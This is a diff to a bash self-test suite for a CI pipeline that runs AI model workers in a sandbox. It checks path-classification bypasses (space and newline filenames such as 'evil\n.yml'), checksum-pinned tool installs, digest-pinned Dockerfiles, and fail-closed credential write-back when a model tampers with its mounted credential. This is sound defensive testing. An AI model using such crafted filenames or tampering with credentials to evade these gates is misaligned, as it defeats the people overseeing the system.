+    "$(grep -c 'py:scripts/worker-pr.py' <<< "${sel//,/$'\n'}" || true)" "1"
+  chk "registry gate compiles a touched NON-suite py (was unvalidated before #140)" \
+    "$(grep -c 'py:scripts/newhelper.py' <<< "${sel//,/$'\n'}" || true)" "1"
+  chk "registry gate does NOT self-test a non-suite py (compile-only, no --self-test)" \
+    "$(grep -c 'self:newhelper.py' <<< "${sel//,/$'\n'}" || true)" "0"
   chk "registry gate runs a touched non-.sh suite py" \
     "$(grep -c 'self:backfill-provenance.py' <<< "${sel//,/$'\n'}" || true)" "1"
   chk "registry gate runs the dashboard privacy self-test" \
     "$(grep -c 'self:dashboard-gen.py' <<< "${sel//,/$'\n'}" || true)" "1"
   chk "registry gate suite includes pat-validity (review r2 #3 — not just when touched)" \
     "$(grep -c 'self:pat-validity.py' <<< "${sel//,/$'\n'}" || true)" "1"
+  # [issue #145] a touched container definition is now classified (was NOTHING before) so the gate
+  # can validate its base-image pinning.
+  chk "registry gate classifies a touched container definition" \
+    "$(grep -c 'dockerfile:containers/worker-model.Dockerfile' <<< "${sel//,/$'\n'}" || true)" "1"
+
+  # --- [issue #141] porcelain parser feeding BOTH gate paths: `-z` + NUL-aware so a space/control
+  # -char path or a rename's two paths cannot slip past classification. The old `cut -c4-` on the
+  # non-z form quoted `crates/x y.rs` into `"crates/x y.rs"` (the leading quote defeats `^crates/`)
+  # and collapsed a rename into one bogus token; each chk below flips RED if the parser regresses to
+  # a naive column cut. Fixture records are `XY <path>` with a rename as `XY <dst>\0<src>\0`. ---
+  local pp
+  pp=$(printf 'A  crates/x y.rs\0R  crates/new.rs\0crates/old.rs\0 M src/lib.rs\0?? notes doc.md\0' \
+    | _porcelain_changed_paths)
+  chk "porcelain: space path emitted whole+unquoted (matches ^crates/, the crate-scoped bypass)" \
+    "$(printf '%s\n' "$pp" | grep -c '^crates/x y\.rs$')" "1"
+  chk "porcelain: no shell-quoted token survives (the exact #141 bypass)" \
+    "$(printf '%s\n' "$pp" | grep -c '^"')" "0"
+  chk "porcelain: rename destination emitted" \
+    "$(printf '%s\n' "$pp" | grep -c '^crates/new\.rs$')" "1"
+  chk "porcelain: rename SOURCE also emitted (both endpoints validated)" \
+    "$(printf '%s\n' "$pp" | grep -c '^crates/old\.rs$')" "1"
+  chk "porcelain: no arrow token survives (rename not collapsed to one path)" \
+    "$(printf '%s\n' "$pp" | grep -c ' -> ')" "0"
+  chk "porcelain: ordinary modified path parsed" \
+    "$(printf '%s\n' "$pp" | grep -c '^src/lib\.rs$')" "1"
+  chk "porcelain: untracked space path parsed whole" \
+    "$(printf '%s\n' "$pp" | grep -c '^notes doc\.md$')" "1"
+
+  # --- [#434 review r1] git permits NEWLINE bytes in filenames, and every consumer downstream of
+  # this parser is newline-framed: `.github/workflows/evil\n.yml` would split into two fragments,
+  # NEITHER matching `.github/workflows/*.yml`, so the touched workflow got no direct target and
+  # the gate could still pass (zero targets is legitimate for docs-only diffs); the same trick
+  # hides scripts/*.py|sh. A newline path is unrepresentable in this framing, so the parser must
+  # REFUSE it (non-zero exit, NOTHING on stdout) in a plain record AND in a rename endpoint. Each
+  # chk flips RED if the parser regresses to splitting/emitting such a path. ---
+  chk "porcelain: newline-containing path is refused, not split (the #434 wf-gate bypass)" \
+    "$( (printf 'A  .github/workflows/evil\n.yml\0' | _porcelain_changed_paths >/dev/null 2>&1 \
+      && echo parsed) || echo refused)" "refused"
+  chk "porcelain: refused parse emits NO paths (a status-blind caller classifies nothing)" \
+    "$(printf 'A  .github/workflows/evil\n.yml\0 M scripts/x.py\0' \
+      | _porcelain_changed_paths 2>/dev/null || true)" ""
+  chk "porcelain: newline in a rename SOURCE endpoint is refused too" \
+    "$( (printf 'R  clean.yml\0scripts/evil\n.py\0' | _porcelain_changed_paths >/dev/null 2>&1 \
+      && echo parsed) || echo refused)" "refused"
+
+  # --- [issue #140 review r1, #428 review r2] pinned actionlint provisioning. The gate fails
+  # closed when a workflow changed and actionlint is missing, so the worker lane must provision a
+  # pinned, sha256-verified binary itself — otherwise every wf: change dies at the gate. Both
+  # directions, offline via file:// fixtures: a digest-matching artifact is installed and runnable
+  # (legitimate workflow maintenance stays passable), while a tarball mismatch, an extracted-binary
+  # mismatch, and an unreachable download are refused with nothing kept — and [r2] the CACHE sits
+  # inside the checksum boundary too: a cached binary is reused only while it still matches the
+  # pinned binary digest; a tampered one is discarded, never executed. ---
+  mkdir -p "$tmp/al-src"
+  printf '#!/usr/bin/env bash\necho stub-actionlint-ok\n' > "$tmp/al-src/actionlint"
+  chmod +x "$tmp/al-src/actionlint"
+  tar -C "$tmp/al-src" -czf "$tmp/al-good.tar.gz" actionlint
+  local al_tar_sha al_bin_sha al_zeros al_bin
+  al_tar_sha=$(sha256sum "$tmp/al-good.tar.gz" | cut -d' ' -f1)
+  al_bin_sha=$(sha256sum "$tmp/al-src/actionlint" | cut -d' ' -f1)
+  al_zeros=$(printf '0%.0s' {1..64})
+  al_bin=$(_fetch_pinned_actionlint "$tmp/al-dest" "file://$tmp/al-good.tar.gz" \
+    "$al_tar_sha" "$al_bin_sha" || true)
+  chk "checksum-matching actionlint artifact installs into the dest dir" \
+    "$al_bin" "$tmp/al-dest/actionlint"
+  chk "provisioned actionlint binary is runnable" \
+    "$([[ -n "$al_bin" ]] && "$al_bin" 2>/dev/null || echo missing)" "stub-actionlint-ok"
+  chk "tarball-checksum-MISMATCHED actionlint artifact is refused (fail closed)" \
+    "$( (_fetch_pinned_actionlint "$tmp/al-bad" "file://$tmp/al-good.tar.gz" \
+      "$al_zeros" "$al_bin_sha" >/dev/null 2>&1 && echo installed) || echo refused)" "refused"
+  chk "refused artifact leaves NO trusted binary behind" \
+    "$([[ -e "$tmp/al-bad/actionlint" ]] && echo present || echo absent)" "absent"
+  # [r2] the tarball digest alone is not the boundary: the EXTRACTED binary is verified too, so a
+  # verified-tarball-but-wrong-binary outcome (e.g. a partial extraction) never installs.
+  chk "extracted-binary-digest MISMATCH is refused even when the tarball digest matched" \
+    "$( (_fetch_pinned_actionlint "$tmp/al-binbad" "file://$tmp/al-good.tar.gz" \
+      "$al_tar_sha" "$al_zeros" >/dev/null 2>&1 && echo installed) || echo refused)" "refused"
+  chk "binary-digest refusal leaves NO binary behind" \
+    "$([[ -e "$tmp/al-binbad/actionlint" ]] && echo present || echo absent)" "absent"
+  chk "unreachable actionlint download is a refusal, not a silent fallback" \
+    "$( (_fetch_pinned_actionlint "$tmp/al-miss" "file://$tmp/no-such-artifact.tar.gz" \
+      "$al_tar_sha" "$al_bin_sha" >/dev/null 2>&1 && echo installed) || echo refused)" "refused"
+  # [r2] a failed provisioning must also EVICT any pre-existing dest binary — otherwise a stale or
+  # partially written leftover would survive for the cache fast path to pick up on a later run.
+  mkdir -p "$tmp/al-stale"
+  printf '#!/usr/bin/env bash\necho stale\n' > "$tmp/al-stale/actionlint"
+  chmod +x "$tmp/al-stale/actionlint"
+  (_fetch_pinned_actionlint "$tmp/al-stale" "file://$tmp/no-such-artifact.tar.gz" \
+    "$al_tar_sha" "$al_bin_sha") >/dev/null 2>&1 || true
+  chk "failed provisioning evicts a pre-existing dest binary (nothing left to mis-trust)" \
+    "$([[ -e "$tmp/al-stale/actionlint" ]] && echo present || echo absent)" "absent"
+  # resolution order: an actionlint already on PATH wins (no download); a cache copy is reused
+  # ONLY while it matches the pinned binary digest; a tampered cache copy is discarded and (with
+  # the fixture download unreachable) the whole resolution refuses rather than executing it.
+  chk "_ensure_actionlint prefers an actionlint already on PATH" \
+    "$(PATH="$tmp/al-src:$PATH" _ensure_actionlint)" "$tmp/al-src/actionlint"
+  # a restricted PATH holding the tools _ensure_actionlint itself needs but NO actionlint, so the
+  # cache branch is deterministic even on hosts that have actionlint installed
+  mkdir -p "$tmp/al-path"
+  local al_tool
+  for al_tool in sha256sum uname mktemp dirname curl tar rm mkdir mv; do
+    ln -sf "$(command -v "$al_tool")" "$tmp/al-path/$al_tool"
+  done
+  mkdir -p "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}"
+  cp "$tmp/al-src/actionlint" "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}/actionlint"
+  chmod +x "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}/actionlint"
+  chk "_ensure_actionlint reuses a cache copy that matches the pinned binary digest" \
+    "$(PATH="$tmp/al-path" WORKER_TOOL_CACHE="$tmp/al-cache" \
+       _ensure_actionlint "$al_bin_sha" "file://$tmp/no-such-artifact.tar.gz" "$al_tar_sha")" \
+    "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}/actionlint"
+  # [r2] the cache fast path is INSIDE the checksum boundary: a tampered/truncated cache copy is
+  # never trusted on executability alone — it is discarded, and with no verifiable download the
+  # resolution refuses (fail closed) instead of executing it.
+  printf '#!/usr/bin/env bash\necho tampered\n' \
+    > "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}/actionlint"
+  chk "_ensure_actionlint REFUSES a cached binary that fails the pinned digest" \
+    "$(PATH="$tmp/al-path" WORKER_TOOL_CACHE="$tmp/al-cache" \
+       _ensure_actionlint "$al_bin_sha" "file://$tmp/no-such-artifact.tar.gz" "$al_tar_sha" \
+       2>/dev/null || echo refused)" "refused"
+  chk "the tampered cache copy is discarded, not left for a later run to trust" \
+    "$([[ -e "$tmp/al-cache/actionlint-${_ACTIONLINT_VERSION}/actionlint" ]] && echo present || echo absent)" \
+    "absent"
+
+  # --- [issue #145] container base-image pin check (non-vacuous: a mutable-tag base FAILS). Proves
+  # the real worker sandbox is digest-pinned, that an unpinned base is rejected, and that a
+  # multi-stage FROM referencing a prior build stage is allowed unpinned. ---
+  chk "the live worker-model sandbox is digest-pinned" \
+    "$( _assert_dockerfile_pinned "$SCRIPT_DIR/../containers/worker-model.Dockerfile" >/dev/null 2>&1 \
+        && echo pinned || echo unpinned)" "pinned"
+  printf 'FROM node:20-slim@sha256:%s AS node\nFROM rust:1.88@sha256:%s\nCOPY --from=node /x /x\n' \
+    "$(printf 'a%.0s' {1..64})" "$(printf 'b%.0s' {1..64})" > "$tmp/ok.Dockerfile"
+  chk "digest-pinned multi-stage Dockerfile passes" \
+    "$( _assert_dockerfile_pinned "$tmp/ok.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "pinned"
+  printf 'FROM node:20-slim\n' > "$tmp/bad.Dockerfile"
+  chk "mutable-tag base image is REJECTED (non-vacuous)" \
+    "$( _assert_dockerfile_pinned "$tmp/bad.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "unpinned"
+  printf 'FROM rust:1.88@sha256:%s AS build\nFROM build\n' "$(printf 'c%.0s' {1..64})" \
+    > "$tmp/stage.Dockerfile"
+  chk "multi-stage FROM referencing a prior stage alias is allowed unpinned" \
+    "$( _assert_dockerfile_pinned "$tmp/stage.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "pinned"
+  # [review r1 #402] the pin check must be SOUND, not a bare `@sha256:` substring test: a
+  # variable-expanded ref, a short digest, a non-hex digest, and an empty digest must ALL be
+  # rejected — each flips this red if the assertion regresses to the syntactic form.
+  printf 'FROM ${IMAGE}@sha256:${DIGEST}\n' > "$tmp/var.Dockerfile"
+  chk "variable-expanded FROM ref is REJECTED (no build-arg image selection)" \
+    "$( _assert_dockerfile_pinned "$tmp/var.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "unpinned"
+  printf 'FROM node:20-slim@sha256:deadbeef\n' > "$tmp/short.Dockerfile"
+  chk "short (non-64) digest is REJECTED" \
+    "$( _assert_dockerfile_pinned "$tmp/short.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "unpinned"
+  printf 'FROM node:20-slim@sha256:%s\n' "$(printf 'g%.0s' {1..64})" > "$tmp/nonhex.Dockerfile"
+  chk "non-hex 64-char digest is REJECTED" \
+    "$( _assert_dockerfile_pinned "$tmp/nonhex.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "unpinned"
+  printf 'FROM node:20-slim@sha256:\n' > "$tmp/empty.Dockerfile"
+  chk "empty digest is REJECTED" \
+    "$( _assert_dockerfile_pinned "$tmp/empty.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
+    "unpinned"
+
+  # --- [issue #40 -> #575] The post-gate token-TTL problem app-token-post/app-token-publish existed
+  # to solve is now solved STRUCTURALLY: the publisher is a separate job on a fresh runner, so it
+  # always starts from a brand-new mint and can never inherit a token minted before a >60-minute
+  # gate. The #40 PROPERTY that survives — a followups-only run (model succeeded, gate FAILED) must
+  # still file the model's declared follow-ups — is asserted on the publisher's followups step,
+  # which needs its explicit always() for exactly the old reason: without a status function GitHub
+  # implicitly success()-gates the `if`, and a failed gate would skip it. The `pr` step (correctly
+  # gate-gated, no always()) is the negative control proving the extractor reads per-step rather
+  # than matching anywhere in the file. ---
+  local wf="$SCRIPT_DIR/../.github/workflows/worker.yml"
+  chk "followups step runs on a failed gate (always()-guarded)" \
+    "$(_workflow_step_if "$wf" followups | grep -c 'always()' || true)" "1"
+  chk "followups only fires on a VERIFIED bundle (never on unverified model output)" \
+    "$(_workflow_step_if "$wf" followups | grep -Fc "steps.verify.outcome == 'success'" || true)" "1"
+  chk "the publish/PR step stays gate-gated — NOT always() (extractor is per-step, non-vacuous)" \
+    "$(_workflow_step_if "$wf" pr | grep -c 'always()' || true)" "0"
+  chk "the publish/PR step is guarded by gate success" \
+    "$(_workflow_step_if "$wf" pr | grep -Fc "needs.worker.outputs.gate_outcome == 'success'" || true)" "1"
+
+  # The extractor must CLOSE a step at its JOB boundary. Until #575 a last-in-job step never saw a
+  # closing `- name:`, so the scan ran on into the following jobs and reported the most recent
+  # JOB-LEVEL `if:` as if it were the step's own — the followups assertion above would have been
+  # measuring `final_state`'s condition and passing on it.
+  local wf_fixture="$tmp/step-if-fixture.yml"
+  cat > "$wf_fixture" <<'WFFIX'
+jobs:
+  first:
+    steps:
+      - name: last step in the job, carries no if:
+        id: tail
+  second:
+    if: ${{ always() && SOMEONE-ELSES-CONDITION }}
+    steps:
+      - name: unrelated
+        id: other
+        if: ${{ never() }}
+WFFIX
+  chk "#575: _workflow_step_if closes a LAST-IN-JOB step at the job boundary (no cross-job bleed)" \
+    "$(_workflow_step_if "$wf_fixture" tail)" ""
+  chk "#575: ...and still reads a step's OWN if: (the boundary fix is not a blanket empty)" \
+    "$(_workflow_step_if "$wf_fixture" other)" '${{ never() }}'
+
+  # --- [issue #575] THE WIRING INVARIANT, asserted on the LIVE workflow. The finding was that the
+  # target's own gate ran on the same runner, in the same job, as a token-bearing publisher. These
+  # lines are what make a regression to that shape a red tick rather than a silent reopening. ---
+  chk "#575 (LIVE): NO GH_TOKEN reaches any worker-job step after the hostile gate" \
+    "$(_tokens_after_gate "$wf" | wc -l | tr -d ' ')" "0"
+  # THE MUTANT: the shape that shipped — a token-bearing publish step immediately after the gate.
+  # Without it the scan above could pass simply by failing to find anything at all.
+  local wf_mutant="$tmp/worker-mutant.yml"
+  awk '{ print }
+       /worker-live\.sh gate$/ {
+         print "      - name: Commit, push, and open DRAFT target pull request"
+         print "        env:"
+         print "          GH_TOKEN: ${{ steps.app-token-publish.outputs.token }}"
+       }' "$wf" > "$wf_mutant"
+  chk "#575: the post-gate token scan is NON-VACUOUS (it catches the shape that shipped)" \
+    "$(_tokens_after_gate "$wf_mutant" | wc -l | tr -d ' ')" "1"
+  chk "#575 (LIVE): the pre-gate/post-model write-token mints are gone from the worker job" \
+    "$(grep -Ec '^        id: app-token-(publish|post)$' "$wf" || true)" "0"
+  local verify_ln mint_ln
+  verify_ln=$(grep -n 'worker-live\.sh verify-bundle' "$wf" | head -n1 | cut -d: -f1)
+  mint_ln=$(grep -n '^        id: app-token-pub$' "$wf" | head -n1 | cut -d: -f1)
+  chk "#575 (LIVE): the bundle is VERIFIED BEFORE the publisher mints any token" \
+    "$([[ -n "$verify_ln" && -n "$mint_ln" && "$verify_ln" -lt "$mint_ln" ]] \
+        && printf before || printf after-or-missing)" "before"
+  chk "#575 (LIVE): the publisher takes its base from the PRE-GATE record, not the worker worktree" \
+    "$(grep -Fc 'ref: ${{ needs.worker.outputs.bundle_base_sha }}' "$wf" || true)" "1"
 
   # --- crate-scoped gate package validation (defect #2, run 29634738177): the area:<label> →
   # `cargo -p` mapping crashed with exit 101 when the label was not a workspace-member name.
@@ -1705,10 +3253,20 @@ TOML
 printf '%s\n' "$*" > "$WB_CAPTURE/argv"
 cat > "$WB_CAPTURE/stdin"
 printf '%s\n' "${GH_TOKEN:-}" > "$WB_CAPTURE/token"
+# Real gh prints the secret NAME on success ("✓ Set secret ${ACCTNN}_TOKEN for o/r"); echo our argv
+# (which carries the account-derived name) to stderr so the "never echoes the account secret
+# reference" assertion is NON-VACUOUS on the success path too — dropping write_back's output capture
+# would let that name reach the public log even when the call succeeds.
+printf 'gh: Set secret %s\n' "$*" >&2
 FAKE
   chmod +x "$tmp/wb-gh"
-  printf 'sk-ant-oat-ROTATED-SENTINEL' > "$wbroot/current"
-  printf 'sk-ant-oat-old-baseline' > "$wbroot/baseline"
+  # Issue #596: the mounted credential comes back byte-identical (the read-only mount guarantees
+  # it), and ROTATION is signalled by worker-prep's host-side durable material + marker. The durable
+  # file — never the mounted one — is what streams to `gh secret set`.
+  printf 'sk-ant-oat-mounted' > "$wbroot/current"
+  printf 'sk-ant-oat-mounted' > "$wbroot/baseline"
+  printf 'sk-ant-oat-ROTATED-SENTINEL' > "$wbroot/.credential-durable"
+  printf 'rotated\n' > "$wbroot/.credential-rotated"
   : > "$wb_out"
   # Subshell so the fixture env never leaks; `if` so a die() surfaces as a red chk, not a silent
   # set -e abort of the whole self-test.
@@ -1717,7 +3275,7 @@ FAKE
            WORKER_CREDENTIAL_PATH="$wbroot/current" \
            WORKER_CREDENTIAL_BASELINE="$wbroot/baseline" \
            WORKER_CREDENTIAL_FORMAT=claude-oauth-token \
-           WORKER_ACCOUNT=acct05 WORKER_SECRET_REF=ACCT05_TOKEN \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
            REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
            GITHUB_OUTPUT="$wb_out" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$wbcap"
     write_back
@@ -1725,7 +3283,7 @@ FAKE
   chk "write_back succeeds on a rotated credential" "$wb_rc" "0"
   chk "write_back gh argv targets the dispatch-secrets ENVIRONMENT (exact, no --body)" \
     "$(cat "$wbcap/argv" 2>/dev/null)" \
-    "secret set ACCT05_TOKEN --repo o/r --env dispatch-secrets"
+    "secret set ACCTEXAMPLE_TOKEN --repo o/r --env dispatch-secrets"
   chk "write_back streams the credential via STDIN (never argv)" \
     "$(cat "$wbcap/stdin" 2>/dev/null)" "sk-ant-oat-ROTATED-SENTINEL"
   chk "write_back authenticates gh with the registry PAT" \
@@ -1734,6 +3292,756 @@ FAKE
     "$(grep -c '^rotated=true$' "$wb_out" || true)" "1"
   chk "write_back never echoes the credential value" \
     "$(grep -c 'ROTATED-SENTINEL' "$tmp/wb.log" || true)" "0"
+  # Issue #135: the ${ACCTNN}_TOKEN secret reference reverses to the raw handle, so the public
+  # write-back log must never contain it (the identifier stays out of the log entirely).
+  chk "write_back never echoes the account secret reference" \
+    "$(grep -c 'ACCTEXAMPLE_TOKEN\|acctexample' "$tmp/wb.log" || true)" "0"
+
+  # --- write-back FAILURE path (#376 r1): `gh secret set` can fail (API/auth/validation) and echo
+  # the account-derived secret name from its argv in its diagnostic — that name reverses to the raw
+  # handle. So the failure must (a) leak NEITHER identifier to the PUBLIC log, and (b) fail closed:
+  # non-zero exit, and NO rotated=true (never claim a rotation the central env copy did not receive).
+  # Hermetic: a fake gh that exits non-zero while printing both identifiers to stderr. Reverting the
+  # output-capture + fixed-diagnostic in write_back turns the leak/rotated assertions red. ---
+  local wb_fail_out="$tmp/wb-fail-github-output" wbf_rc
+  cat > "$tmp/wb-gh-fail" <<'FAKE'
+#!/usr/bin/env bash
+cat > /dev/null
+printf 'gh: failed to set secret ACCTEXAMPLE_TOKEN for account acctexample: HTTP 403\n' >&2
+exit 1
+FAKE
+  chmod +x "$tmp/wb-gh-fail"
+  : > "$wb_fail_out"
+  if (
+    export WORKER_ROOT="$wbroot" \
+           WORKER_CREDENTIAL_PATH="$wbroot/current" \
+           WORKER_CREDENTIAL_BASELINE="$wbroot/baseline" \
+           WORKER_CREDENTIAL_FORMAT=claude-oauth-token \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_fail_out" WORKER_GH_BIN="$tmp/wb-gh-fail" WB_CAPTURE="$wbcap"
+    write_back
+  ) > "$tmp/wb-fail.log" 2>&1; then wbf_rc=0; else wbf_rc=$?; fi
+  chk "write_back FAILS closed (non-zero) when gh secret set fails" \
+    "$([[ "$wbf_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "write_back failure never leaks the account secret reference to the public log" \
+    "$(grep -c 'ACCTEXAMPLE_TOKEN\|acctexample' "$tmp/wb-fail.log" || true)" "0"
+  chk "write_back failure does NOT report rotated=true (fail closed)" \
+    "$(grep -c '^rotated=true$' "$wb_fail_out" || true)" "0"
+
+  # --- issue #596 write_back contract changes. Three distinct behaviours, each hermetic. ---
+  # (1) NO rotation: the host-side pre-flight produced no new durable material (the stored access
+  # token was still valid, so nothing was exchanged). Nothing to persist, and `gh` must not be
+  # invoked at all.
+  local wbroot2="$tmp/wbroot-norot" wb_out2="$tmp/wb2-github-output" wb2_rc
+  mkdir -p "$wbroot2" "$tmp/wbcap2"
+  printf 'sk-ant-oat-mounted' > "$wbroot2/current"
+  printf 'sk-ant-oat-mounted' > "$wbroot2/baseline"
+  : > "$wb_out2"
+  if (
+    export WORKER_ROOT="$wbroot2" WORKER_CREDENTIAL_PATH="$wbroot2/current" \
+           WORKER_CREDENTIAL_BASELINE="$wbroot2/baseline" \
+           WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out2" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap2"
+    write_back
+  ) > "$tmp/wb2.log" 2>&1; then wb2_rc=0; else wb2_rc=$?; fi
+  chk "write_back (no host-side rotation) succeeds" "$wb2_rc" "0"
+  chk "write_back (no host-side rotation) reports rotated=false" \
+    "$(grep -c '^rotated=false$' "$wb_out2" || true)" "1"
+  chk "write_back (no host-side rotation) never invokes gh at all" \
+    "$([[ -e "$tmp/wbcap2/argv" ]] && printf called || printf uncalled)" "uncalled"
+
+  # (2) MISSING PAT: the lane must still WORK (this run already holds a fresh access token) — warn,
+  # report rotated=true, exit 0, and touch no secret. A missing PAT is NEVER fatal.
+  local wbroot3="$tmp/wbroot-nopat" wb_out3="$tmp/wb3-github-output" wb3_rc
+  mkdir -p "$wbroot3" "$tmp/wbcap3"
+  printf 'sk-ant-oat-mounted' > "$wbroot3/current"
+  printf 'sk-ant-oat-mounted' > "$wbroot3/baseline"
+  printf 'sk-ant-oat-ROTATED-SENTINEL' > "$wbroot3/.credential-durable"
+  printf 'rotated\n' > "$wbroot3/.credential-rotated"
+  : > "$wb_out3"
+  if (
+    export WORKER_ROOT="$wbroot3" WORKER_CREDENTIAL_PATH="$wbroot3/current" \
+           WORKER_CREDENTIAL_BASELINE="$wbroot3/baseline" \
+           WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r GITHUB_OUTPUT="$wb_out3" \
+           WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap3"
+    unset REGISTRY_SECRETS_PAT
+    write_back
+  ) > "$tmp/wb3.log" 2>&1; then wb3_rc=0; else wb3_rc=$?; fi
+  chk "write_back with a MISSING PAT still succeeds (never fatal)" "$wb3_rc" "0"
+  chk "write_back with a MISSING PAT warns" \
+    "$(grep -c '^::warning::Account credential rotated host-side' "$tmp/wb3.log" || true)" "1"
+  chk "write_back with a MISSING PAT reports rotated=true" \
+    "$(grep -c '^rotated=true$' "$wb_out3" || true)" "1"
+  chk "write_back with a MISSING PAT never invokes gh" \
+    "$([[ -e "$tmp/wbcap3/argv" ]] && printf called || printf uncalled)" "uncalled"
+  chk "write_back with a MISSING PAT never echoes the durable credential" \
+    "$(grep -c 'ROTATED-SENTINEL' "$tmp/wb3.log" || true)" "0"
+
+  # (3) TAMPER (issue #134 containment, KEPT): the mounted credential came back DIFFERENT from what
+  # worker-prep materialized, so the read-only mount was defeated. Refuse everything: non-zero, no
+  # rotated=true, and `gh` never invoked — a poisoned document must never reach the central secret.
+  local wbroot4="$tmp/wbroot-tamper" wb_out4="$tmp/wb4-github-output" wb4_rc
+  mkdir -p "$wbroot4" "$tmp/wbcap4"
+  printf 'POISONED-BY-THE-MODEL' > "$wbroot4/current"
+  printf 'sk-ant-oat-mounted' > "$wbroot4/baseline"
+  printf 'POISONED-BY-THE-MODEL' > "$wbroot4/.credential-durable"
+  printf 'rotated\n' > "$wbroot4/.credential-rotated"
+  : > "$wb_out4"
+  if (
+    export WORKER_ROOT="$wbroot4" WORKER_CREDENTIAL_PATH="$wbroot4/current" \
+           WORKER_CREDENTIAL_BASELINE="$wbroot4/baseline" \
+           WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out4" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap4"
+    write_back
+  ) > "$tmp/wb4.log" 2>&1; then wb4_rc=0; else wb4_rc=$?; fi
+  chk "write_back FAILS closed when the mounted credential was tampered with" \
+    "$([[ "$wb4_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "write_back tamper path never invokes gh (no poisoned secret write)" \
+    "$([[ -e "$tmp/wbcap4/argv" ]] && printf called || printf uncalled)" "uncalled"
+  chk "write_back tamper path does NOT report rotated=true" \
+    "$(grep -c '^rotated=true$' "$wb_out4" || true)" "0"
+  chk "write_back tamper path reports rotated=false" \
+    "$(grep -c '^rotated=false$' "$wb_out4" || true)" "1"
+
+  # --- (4) THE RESCUED FAILURE PATH (retro-review of #614). worker-prep's pre-flight consumed the
+  # ONE-TIME-USE grant and wrote the rotated replacement + its format + the marker, and prepare THEN
+  # died before materializing the mount and before the $GITHUB_ENV export. So WORKER_CREDENTIAL_PATH
+  # / _BASELINE / _FORMAT are all ABSENT. Before this fix the workflow skipped write-back entirely
+  # (`steps.prepare.outcome == 'success'`) and, had it not, write_back died on `credential paths
+  # escaped WORKER_ROOT`. Either way the only copy of the new grant went to the bin with the runner
+  # and the account was permanently dead. It must now PERSIST, warn about why, take the format from
+  # the host-side record, and still never echo the material. ---
+  local wbroot5="$tmp/wbroot-noenv" wb_out5="$tmp/wb5-github-output" wb5_rc
+  mkdir -p "$wbroot5" "$tmp/wbcap5"
+  printf '{"tokens":{"refresh_token":"ROTATED-SENTINEL-NOENV"}}' > "$wbroot5/.credential-durable"
+  printf 'codex-auth-json\n' > "$wbroot5/.credential-format"
+  printf 'rotated\n' > "$wbroot5/.credential-rotated"
+  : > "$wb_out5"
+  if (
+    export WORKER_ROOT="$wbroot5" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out5" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap5"
+    unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wb5.log" 2>&1; then wb5_rc=0; else wb5_rc=$?; fi
+  chk "write_back PERSISTS a host-side rotation when prepare aborted before the mount existed" \
+    "$wb5_rc" "0"
+  chk "write_back (prepare aborted) still writes to the dispatch-secrets ENVIRONMENT" \
+    "$(cat "$tmp/wbcap5/argv" 2>/dev/null)" \
+    "secret set ACCTEXAMPLE_TOKEN --repo o/r --env dispatch-secrets"
+  chk "write_back (prepare aborted) streams the ROTATED durable credential" \
+    "$(cat "$tmp/wbcap5/stdin" 2>/dev/null)" \
+    '{"tokens":{"refresh_token":"ROTATED-SENTINEL-NOENV"}}'
+  chk "write_back (prepare aborted) reports rotated=true" \
+    "$(grep -c '^rotated=true$' "$wb_out5" || true)" "1"
+  chk "write_back (prepare aborted) says WHY it proceeded without the mount contract" \
+    "$(grep -c '^::warning::The credential pre-flight rotated this account host-side' "$tmp/wb5.log" || true)" "1"
+  chk "write_back (prepare aborted) never echoes the rotated credential" \
+    "$(grep -c 'ROTATED-SENTINEL-NOENV' "$tmp/wb5.log" || true)" "0"
+  chk "write_back (prepare aborted) never echoes the account secret reference" \
+    "$(grep -c 'ACCTEXAMPLE_TOKEN\|acctexample' "$tmp/wb5.log" || true)" "0"
+  # ...and with NO rotation the same env-less invocation is still a clean no-op, never a failure:
+  # this is the ordinary shape of every run where prepare failed before the pre-flight even ran.
